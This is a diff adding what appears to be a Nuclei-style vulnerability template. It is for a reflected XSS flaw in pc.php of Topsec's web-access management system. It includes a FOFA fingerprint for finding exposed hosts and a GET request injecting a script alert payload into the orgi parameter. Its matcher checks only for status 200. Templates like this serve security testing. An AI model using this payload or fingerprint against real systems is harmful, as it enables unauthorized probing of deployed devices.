@@ -1,0 +1,19 @@
+id: poc-ar4i1g02lrblk6bv
+info:
+  name: 天融信上网行为管理系统pc.php存在xss漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ar4i1g02lrblk6bv'
+  tags: xss,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ar4i1g02lrblk6bv
+    fofa: body="ActiveXObject" && body="dkey_login" && body="repeat-x"
+http:
+- raw:
+  - GET /smsauth/adverdeclare/pc.php?orgi=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
